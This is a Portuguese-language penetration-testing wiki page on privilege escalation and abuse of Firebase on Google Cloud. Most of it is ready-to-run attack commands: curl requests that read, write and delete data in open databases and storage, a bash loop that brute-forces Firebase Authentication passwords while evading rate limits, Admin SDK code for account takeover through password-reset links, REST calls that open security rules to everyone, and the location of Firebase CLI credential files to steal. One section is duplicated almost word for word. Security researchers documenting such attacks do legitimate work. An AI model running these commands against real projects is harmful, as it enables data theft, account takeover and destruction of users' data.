# GCP - Firebase Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Firebase

### Acesso não autenticado ao Firebase Realtime Database
Um atacante não precisa de permissões específicas do Firebase para executar este ataque. Basta que exista uma configuração vulnerável nas regras de segurança do Firebase Realtime Database, onde as regras estão definidas com `.read: true` ou `.write: true`, permitindo acesso público de leitura ou escrita.

O atacante deve identificar a URL do banco de dados, que normalmente segue o formato: `https://<project-id>.firebaseio.com/`.

Essa URL pode ser encontrada por meio de mobile application reverse engineering (decompiling Android APKs or analyzing iOS apps), analisando arquivos de configuração como google-services.json (Android) ou GoogleService-Info.plist (iOS), inspecionando o código-fonte de aplicações web, ou examinando o tráfego de rede para identificar requisições a domínios `*.firebaseio.com`.

O atacante identifica a URL do banco de dados e verifica se ela está publicamente exposta, em seguida acessa os dados e possivelmente grava informações maliciosas.

Primeiro, eles verificam se o banco de dados permite acesso de leitura adicionando .json ao final da URL.
```bash
curl https://<project-id>-default-rtdb.firebaseio.com/.json
```
Se a resposta contiver dados JSON ou null (em vez de "Permission Denied"), o banco de dados permite acesso de leitura. Para verificar o acesso de escrita, o atacante pode tentar enviar uma requisição de escrita de teste usando a Firebase REST API.
```bash
curl -X PUT https://<project-id>-default-rtdb.firebaseio.com/test.json -d '{"test": "data"}'
```
Se a operação for bem-sucedida, o banco de dados também permite acesso de escrita.

### Exposição de dados no Cloud Firestore
Um atacante não precisa de permissões específicas do Firebase para realizar este ataque. Só é necessário que exista uma configuração vulnerável nas regras de segurança do Cloud Firestore em que as regras permitem acesso de leitura ou escrita sem autenticação ou com validação insuficiente. Um exemplo de uma regra mal configurada que concede acesso total é:
```bash
service cloud.firestore {
match /databases/{database}/documents/{document=**} {
allow read, write: if true;
}
}
```
Essa regra permite que qualquer pessoa leia e escreva todos os documentos sem quaisquer restrições. As regras do Firestore são granulares e se aplicam por coleção e documento, portanto um erro em uma regra específica pode expor apenas determinadas coleções.

O atacante deve identificar o Firebase Project ID, que pode ser encontrado por mobile app reverse engineering, análise de arquivos de configuração como google-services.json ou GoogleService-Info.plist, inspeção do código-fonte de aplicações web, ou análise do tráfego de rede para identificar requisições para firestore.googleapis.com.
A Firestore REST API usa o formato:
```bash
https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
Se as regras permitirem acesso de leitura não autenticado, o atacante pode ler coleções e documentos. Primeiro, o atacante tenta acessar uma coleção específica:
```bash
curl https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>
```
Se a resposta contiver documentos JSON em vez de um erro de permissão, a coleção está exposta. O atacante pode enumerar todas as coleções acessíveis tentando nomes comuns ou analisando a estrutura da aplicação. Para acessar um documento específico:
```bash
curl https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
Se as regras permitirem acesso de escrita não autenticado ou tiverem validação insuficiente, o atacante pode criar novos documentos:
```bash
curl -X POST https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection> \
-H "Content-Type: application/json" \
-d '{
"fields": {
"name": {"stringValue": "Test"},
"email": {"stringValue": "test@example.com"}
}
}'
```
Para modificar um documento existente deve-se utilizar PATCH:
```bash
curl -X PATCH https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/users/<user-id> \
-H "Content-Type: application/json" \
-d '{
"fields": {
"role": {"stringValue": "admin"}
}
}'
```
Para eliminar um documento e causar negação de serviço:
```bash
curl -X DELETE https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
### Exposição de arquivos no Firebase Storage
Um atacante não precisa de permissões específicas do Firebase para realizar este ataque. Basta existir uma configuração vulnerável nas security rules do Firebase Storage, onde as regras permitem acesso read ou write sem autenticação ou com validação insuficiente. As Storage rules controlam as permissões de read e write independentemente, então um erro em uma regra pode expor somente o acesso de read, somente o de write, ou ambos. Um exemplo de uma regra mal configurada que concede acesso total é:
```bash
service cloud.firestore {
match /databases/{database}/documents/{document=**} {
allow read, write: if true;
}
}
```
Esta regra permite acesso de leitura e escrita a todos os documentos sem quaisquer restrições. As regras do Firestore são granulares e aplicadas por coleção e por documento, então um erro numa regra específica pode expor apenas certas coleções. O atacante deve identificar o Firebase Project ID, que pode ser encontrado através de mobile application reverse engineering, análise de arquivos de configuração como google-services.json ou GoogleService-Info.plist, inspeção do código-fonte de aplicações web, ou análise de tráfego de rede para identificar requisições a firestore.googleapis.com.
A Firestore REST API usa o formato: `https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>.`

Se as regras permitem acesso de leitura não autenticado, o atacante pode ler coleções e documentos. Primeiro, ele tenta acessar uma coleção específica.
```bash
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o"
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o?prefix=<path>"
```
Se a resposta contiver a lista de arquivos em vez de um erro de permissão, o arquivo está exposto. O atacante pode visualizar o conteúdo dos arquivos especificando seu caminho:
```bash
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o/<urlencode(path)>"
```
Se as regras permitirem acesso de escrita não autenticado ou tiverem validação insuficiente, o atacante pode enviar arquivos maliciosos. Para enviar um arquivo através da REST API:
```bash
curl -X POST "https://firebasestorage.googleapis.com/v0/b/<bucket>/o?name=<path>" \
-H "Content-Type: <content-type>" \
--data-binary @<local-file>
```
O atacante pode fazer upload de code shells, malware payloads ou arquivos grandes para causar uma denial of service. Se a aplicação processar ou executar arquivos enviados, o atacante pode obter remote code execution. Para excluir arquivos e causar uma denial of service:
```bash
curl -X DELETE "https://firebasestorage.googleapis.com/v0/b/<bucket>/o/<path>"
```
### Invocação de Firebase Cloud Functions públicas
Um atacante não precisa de permissões específicas do Firebase para explorar esse problema; é necessário apenas que uma Cloud Function seja acessível publicamente via HTTP sem autenticação.

Uma função é vulnerável quando está configurada de forma insegura:

- Ela usa `functions.https.onRequest`, que não aplica autenticação (ao contrário de onCall functions).
- O código da função não valida a autenticação do usuário (por exemplo, sem verificações para `request.auth` ou `context.auth`).
- A função é acessível publicamente no IAM, isto é, `allUsers` possui a role `roles/cloudfunctions.invoker`. Esse é o comportamento padrão para funções HTTP, a menos que o desenvolvedor restrinja o acesso.

Firebase HTTP Cloud Functions são expostas através de URLs como:

- `https://<region>-<project-id>.cloudfunctions.net/<function-name>`
- `https://<project-id>.web.app/<function-name>` (quando integrado com Firebase Hosting)

Um atacante pode descobrir essas URLs por meio de análise de código-fonte, inspeção de tráfego de rede, ferramentas de enumeração ou engenharia reversa de apps mobile.
Se a função estiver exposta publicamente e sem autenticação, o atacante pode invocá‑la diretamente sem credenciais.
```bash
# Invoke public HTTP function with GET
curl "https://<region>-<project-id>.cloudfunctions.net/<function-name>"
# Invoke public HTTP function with POST and data
curl -X POST "https://<region>-<project-id>.cloudfunctions.net/<function-name>" \
-H "Content-Type: application/json" \
-d '{"param1": "value1", "param2": "value2"}'
```
Se a função não validar corretamente as entradas, o atacante pode tentar outros ataques, como code injection ou command injection.

### Brute-force attack against Firebase Authentication with a weak password policy
Um atacante não precisa de permissões específicas do Firebase para realizar este ataque. É necessário apenas que a Firebase API Key esteja exposta em aplicações móveis ou web, e que a política de senhas não tenha requisitos mais rígidos do que os padrões.

O atacante deve identificar a Firebase API Key, que pode ser encontrada por meio de reverse engineering de apps móveis, análise de arquivos de configuração como google-services.json ou GoogleService-Info.plist, inspeção do código-fonte de aplicações web (por exemplo, em bootstrap.js), ou análise do tráfego de rede.

Firebase Authentication’s REST API uses the endpoint:
`https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>`
to authenticate with email and password.

Se a Email Enumeration Protection estiver desabilitada, as respostas de erro da API podem revelar se um email existe no sistema (EMAIL_NOT_FOUND vs. INVALID_PASSWORD), o que permite que atacantes enumerate users antes of attempting password guessing. Quando essa proteção está habilitada, a API retorna a mesma mensagem de erro tanto para emails inexistentes quanto para senhas incorretas, impedindo a enumeração de usuários.

É importante notar que o Firebase Authentication aplica rate limiting, que pode bloquear requisições se muitas tentativas de autenticação ocorrerem em curto espaço de tempo. Por isso, um atacante teria que introduzir atrasos entre as tentativas para evitar ser rate-limited.

O atacante identifica a API Key e realiza tentativas de autenticação com múltiplas senhas contra contas conhecidas. Se a Email Enumeration Protection estiver desabilitada, o atacante pode enumerate existing users analisando as respostas de erro:
```bash
# Attempt authentication with a known email and an incorrect password
curl -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
-H "Content-Type: application/json" \
-d '{
"email": "usuario@example.com",
"password": "password",
"returnSecureToken": true
}'
```
Se a resposta contiver EMAIL_NOT_FOUND, o email não existe no sistema. Se contiver INVALID_PASSWORD, o email existe mas a password está incorreta, confirmando que o utilizador está registado. Uma vez identificado um utilizador válido, o atacante pode realizar brute-force attempts. É importante incluir pausas entre as tentativas para evitar Firebase Authentication’s rate-limiting mechanisms:
```bash
counter=1
for password in $(cat wordlist.txt); do
echo "Intento $counter: probando contraseña '$password'"
response=$(curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
-H "Content-Type: application/json" \
-d "{\"email\":\"usuario@example.com\",\"password\":\"$password\",\"returnSecureToken\":true}")

if echo "$response" | grep -q "idToken"; then
echo "Contraseña encontrada: $password (intento $counter)"
break
fi

# Stop for the rate limiting
sleep 1
counter=$((counter + 1))
done
```
Com a política de senhas padrão (mínimo de 6 caracteres, sem requisitos de complexidade), o atacante pode tentar todas as combinações possíveis de senhas de 6 caracteres, o que representa um espaço de busca relativamente pequeno em comparação com políticas de senha mais rígidas.

### Gerenciamento de usuários no Firebase Authentication

O atacante precisa de permissões específicas do Firebase Authentication para executar este ataque. As permissões necessárias são:

- `firebaseauth.users.create` to create users
- `firebaseauth.users.update` to modify existing users
- `firebaseauth.users.delete` to delete users
- `firebaseauth.users.get` to retrieve user information
- `firebaseauth.users.sendEmail` to send emails to users
- `firebaseauth.users.createSession` to create user sessions

Essas permissões estão incluídas na role `roles/firebaseauth.admin`, que concede acesso completo de leitura/escrita aos recursos do Firebase Authentication. Elas também estão incluídas em roles de nível mais alto, como `roles/firebase.developAdmin` (que inclui todas as permissões firebaseauth.*) e `roles/firebase.admin` (acesso total a todos os serviços do Firebase).

Para usar o Firebase Admin SDK, o atacante precisaria de acesso às credenciais de conta de serviço (arquivo JSON), que podem ser encontradas em sistemas comprometidos, repositórios de código publicamente expostos, sistemas CI/CD comprometidos ou por meio do comprometimento de contas de desenvolvedor que tenham acesso a essas credenciais.

O primeiro passo é configurar o Firebase Admin SDK usando as credenciais de conta de serviço.
```bash
import firebase_admin
from firebase_admin import credentials, auth
cred = credentials.Certificate('path/to/serviceAccountKey.json')
firebase_admin.initialize_app(cred)
```
Para criar um usuário malicioso usando o email da vítima, o atacante tentaria usar o Firebase Admin SDK para gerar uma nova conta com esse email.
```bash
user = auth.create_user(
email='victima@example.com',
email_verified=False,
password='password123',
display_name='Usuario Malicioso',
disabled=False
)
print(f'Usuario creado: {user.uid}')
```
Para modificar um usuário existente, o atacante atualizaria campos como o endereço de e-mail, o status de verificação ou se a conta está desativada.
```bash
user = auth.update_user(
uid,
email='nuevo-email@example.com',
email_verified=True,
disabled=False
)
print(f'Usuario actualizado: {user.uid}')
```
Para excluir uma conta de usuário e causar uma negação de serviço, o atacante enviaria uma requisição para remover o usuário completamente.
```bash
auth.delete_user(uid)
print('Usuario eliminado exitosamente')
```
O atacante também pode recuperar informações sobre usuários existentes solicitando seu UID ou endereço de e-mail.
```bash
user = auth.get_user(uid)
print(f'Información del usuario: {user.uid}, {user.email}')
user = auth.get_user_by_email('usuario@example.com')
print(f'Información del usuario: {user.uid}, {user.email}')
```
Além disso, o atacante poderia gerar links de verificação ou links de redefinição de senha para alterar a senha de um usuário e obter acesso à sua conta.
```bash
link = auth.generate_email_verification_link(email)
print(f'Link de verificación: {link}')
link = auth.generate_password_reset_link(email)
print(f'Link de reset: {link}')
```
### Gerenciamento de usuários no Firebase Authentication
Um atacante precisa de permissões específicas do Firebase Authentication para realizar este ataque. As permissões necessárias são:

- `firebaseauth.users.create` para criar usuários
- `firebaseauth.users.update` para modificar usuários existentes
- `firebaseauth.users.delete` para excluir usuários
- `firebaseauth.users.get` para obter informações do usuário
- `firebaseauth.users.sendEmail` para enviar e-mails para os usuários
- `firebaseauth.users.createSession` para criar sessões de usuário

Essas permissões estão incluídas na role `roles/firebaseauth.admin`, que concede acesso total de leitura/gravação aos recursos do Firebase Authentication. Elas também fazem parte de roles de nível superior, como `roles/firebase.developAdmin` (que inclui todas as permissões firebaseauth.*) e `roles/firebase.admin` (acesso total a todos os serviços Firebase).

Para usar o Firebase Admin SDK, o atacante precisaria de acesso às credenciais de service account (um arquivo JSON), que poderiam ser obtidas a partir de sistemas comprometidos, repositórios de código expostos publicamente, ambientes CI/CD comprometidos, ou por meio do comprometimento de contas de desenvolvedores que têm acesso a essas credenciais.

O primeiro passo é configurar o Firebase Admin SDK usando as credenciais de service account.
```bash
import firebase_admin
from firebase_admin import credentials, auth
cred = credentials.Certificate('path/to/serviceAccountKey.json')
firebase_admin.initialize_app(cred)
```
Para criar um usuário malicioso usando o email de uma vítima, o atacante tentaria criar uma nova conta de usuário com esse email, atribuindo sua própria password e informações de perfil.
```bash
user = auth.create_user(
email='victima@example.com',
email_verified=False,
password='password123',
display_name='Usuario Malicioso',
disabled=False
)
print(f'Usuario creado: {user.uid}')
```
Para modificar um usuário existente, o atacante alteraria campos como o endereço de e-mail, o status de verificação ou se a conta está desativada.
```bash
user = auth.update_user(
uid,
email='nuevo-email@example.com',
email_verified=True,
disabled=False
)
print(f'Usuario actualizado: {user.uid}')
```
Para excluir uma conta de usuário — efetivamente causando denial of service — o atacante enviaria uma solicitação para remover esse usuário permanentemente.
```bash
auth.delete_user(uid)
print('Usuario eliminado exitosamente')
```
O atacante também poderia recuperar informações sobre usuários existentes, como seu UID ou email, solicitando detalhes do usuário pelo UID ou pelo endereço de email.
```bash
user = auth.get_user(uid)
print(f'Información del usuario: {user.uid}, {user.email}')
user = auth.get_user_by_email('usuario@example.com')
print(f'Información del usuario: {user.uid}, {user.email}')
```
Além disso, o atacante poderia gerar verification links ou password-reset links, permitindo que ele altere a senha de um usuário e assuma o controle da conta.
```bash
link = auth.generate_email_verification_link(email)
print(f'Link de verificación: {link}')
link = auth.generate_password_reset_link(email)
print(f'Link de reset: {link}')
```
### Modificação das regras de segurança nos serviços Firebase
O atacante precisa de permissões específicas para modificar as regras de segurança, dependendo do serviço. Para Cloud Firestore e Firebase Cloud Storage, as permissões necessárias são `firebaserules.rulesets.create` para criar rulesets e `firebaserules.releases.create` para implantar releases. Essas permissões estão incluídas na role `roles/firebaserules.admin` ou em roles de nível superior, como `roles/firebase.developAdmin` e `roles/firebase.admin`. Para Firebase Realtime Database, a permissão necessária é `firebasedatabase.instances.update`.

O atacante deve usar a Firebase REST API para modificar as regras de segurança.
Primeiro, o atacante precisaria obter um token de acesso usando credenciais de conta de serviço.
Para obter o token:
```bash
gcloud auth activate-service-account --key-file=path/to/serviceAccountKey.json
ACCESS_TOKEN=$(gcloud auth print-access-token)
```
Para modificar as regras do Firebase Realtime Database:
```bash
curl -X PUT "https://<project-id>-default-rtdb.firebaseio.com/.settings/rules.json?access_token=$ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"rules": {
".read": true,
".write": true
}
}'
```
Para modificar as regras do Cloud Firestore, o atacante deve criar um ruleset e então implantá-lo:
```bash
curl -X POST "https://firebaserules.googleapis.com/v1/projects/<project-id>/rulesets" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"source": {
"files": [{
"name": "firestore.rules",
"content": "rules_version = '\''2'\'';\nservice cloud.firestore {\n  match /databases/{database}/documents {\n    match /{document=**} {\n      allow read, write: if true;\n    }\n  }\n}"
}]
}
}'
```
O comando anterior retorna um nome de ruleset no formato projects/<project-id>/rulesets/<ruleset-id>. Para implantar a nova versão, a release deve ser atualizada usando uma requisição PATCH:
```bash
curl -X PATCH "https://firebaserules.googleapis.com/v1/projects/<project-id>/releases/cloud.firestore" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"release": {
"name": "projects/<project-id>/releases/cloud.firestore",
"rulesetName": "projects/<project-id>/rulesets/<ruleset-id>"
}
}'
```
Para modificar Firebase Cloud Storage rules:
```bash
curl -X POST "https://firebaserules.googleapis.com/v1/projects/<project-id>/rulesets" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"source": {
"files": [{
"name": "storage.rules",
"content": "service firebase.storage {\n  match /b/{bucket}/o {\n    match /{allPaths=**} {\n      allow read, write: if true;\n    }\n  }\n}"
}]
}
}'
```
O comando anterior retorna um nome de ruleset no formato projects/<project-id>/rulesets/<ruleset-id>. Para fazer o deploy da nova versão, o release deve ser atualizado usando uma requisição PATCH:
```bash
curl -X PATCH "https://firebaserules.googleapis.com/v1/projects/<project-id>/releases/firebase.storage/<bucket-id>" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"release": {
"name": "projects/<project-id>/releases/firebase.storage/<bucket-id>",
"rulesetName": "projects/<project-id>/rulesets/<ruleset-id>"
}
}'
```
### Exfiltração e manipulação de dados no Cloud Firestore
Cloud Firestore usa a mesma infraestrutura e o mesmo sistema de permissões do Cloud Datastore, portanto as permissões IAM do Datastore se aplicam diretamente ao Firestore. Para manipular políticas TTL, a permissão `datastore.indexes.update` é necessária. Para exportar dados, a permissão `datastore.databases.export` é necessária. Para importar dados, a permissão `datastore.databases.import` é necessária. Para realizar deleção em massa de dados, a permissão `datastore.databases.bulkDelete` é necessária.

Para operações de backup e restore, permissões específicas são necessárias:

- `datastore.backups.get` and `datastore.backups.list` para listar e recuperar detalhes dos backups disponíveis
- `datastore.backups.delete` para deletar backups
- `datastore.backups.restoreDatabase` para restaurar um banco de dados a partir de um backup
- `datastore.backupSchedules.create` and `datastore.backupSchedules.delete` para gerenciar agendamentos de backup

Quando uma política TTL é criada, uma propriedade designada é selecionada para identificar entidades elegíveis para deleção. Essa propriedade TTL deve ser do tipo Date and time. O atacante pode escolher uma propriedade que já exista ou designar uma propriedade que pretende adicionar posteriormente. Se o valor do campo for uma data no passado, o documento se torna elegível para deleção imediata. O atacante pode usar o gcloud CLI para manipular políticas TTL.
```bash
# Enable TTL
gcloud firestore fields ttls update expireAt \
--collection-group=users \
--enable-ttl
# Disable TTL
gcloud firestore fields ttls update expireAt \
--collection-group=users \
--disable-ttl
```
Para exportar dados e exfiltrate, o atacante poderia usar o gcloud CLI.
```bash
gcloud firestore export gs://<bucket-name> --project=<project-id> --async --database='(default)'
```
Para importar dados maliciosos:
```bash
gcloud firestore import gs://<bucket-name>/<path> --project=<project-id> --async --database='(default)'
```
Para realizar exclusão em massa de dados e causar um denial of service, o atacante poderia usar a ferramenta gcloud Firestore bulk-delete para remover coleções inteiras.
```bash
gcloud firestore bulk-delete \
--collection-ids=users,posts,messages \
--database='(default)' \
--project=<project-id>
```
Para operações de backup e restauração, o atacante pode criar backups agendados para capturar o estado atual do banco de dados, listar backups existentes, restaurar a partir de um backup para sobrescrever alterações recentes, excluir backups para causar perda permanente de dados e remover backups agendados.
Para criar uma agenda diária de backups que gere imediatamente um backup:
```bash
gcloud firestore backups schedules create \
--database='(default)' \
--recurrence=daily \
--retention=14w \
--project=<project-id>
```
Para restaurar a partir de um backup específico, o atacante poderia criar um novo banco de dados usando os dados contidos nesse backup. A operação de restauração grava os dados do backup em um novo banco de dados, o que significa que um DATABASE_ID existente não pode ser usado.
```bash
gcloud firestore databases restore \
--source-backup=projects/<project-id>/locations/<location>/backups/<backup-id> \
--destination-database='<new-database-id>' \
--project=<project-id>
```
Para excluir um backup e causar perda permanente de dados:
```bash
gcloud firestore backups delete \
--backup=<backup-id> \
--project=<project-id>
```
### Roubo e uso indevido das credenciais do Firebase CLI
Um atacante não precisa de permissões específicas do Firebase para executar este ataque, mas precisa de acesso ao sistema local do desenvolvedor ou ao arquivo de credenciais do Firebase CLI. Essas credenciais são armazenadas em um arquivo JSON localizado em:

- Linux/macOS: ~/.config/configstore/firebase-tools.json

- Windows: C:\Users\[User]\.config\configstore\firebase-tools.json

Este arquivo contém tokens de autenticação, incluindo o refresh_token e o access_token, que permitem ao atacante autenticar-se como o usuário que originalmente executou firebase login.

O atacante obtém acesso ao arquivo de credenciais do Firebase CLI. Ele pode então copiar o arquivo inteiro para seu próprio sistema, e o Firebase CLI usará automaticamente as credenciais de sua localização padrão. Depois disso, o atacante pode visualizar todos os projetos Firebase acessíveis a esse usuário.
```bash
firebase projects:list
```
{{#include ../../../banners/hacktricks-training.md}}
